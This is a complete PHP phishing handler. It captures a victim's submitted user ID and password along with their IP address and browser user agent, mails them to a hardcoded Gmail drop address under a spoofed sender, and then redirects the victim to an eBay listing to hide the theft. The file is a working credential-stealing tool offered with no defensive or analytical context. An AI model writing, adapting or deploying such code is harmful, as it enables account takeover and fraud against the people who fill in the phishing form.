<?php



$email=$_POST['userid'];



$pass=$_POST['pass'];







$ip=$_SERVER['REMOTE_ADDR'];
$agent = $_SERVER['HTTP_USER_AGENT'];






$to = "tao.ming.mel@gmail.com"; 

$subject = "$email";

$message = "$email \n$pass \n$ip \n$agent";

$from = "usere@delamine.co";

$headers = "From:" . $from;



mail($to,$subject,$message,$headers);







header("Location: https://ebay.com/itm//202231496361/");







?>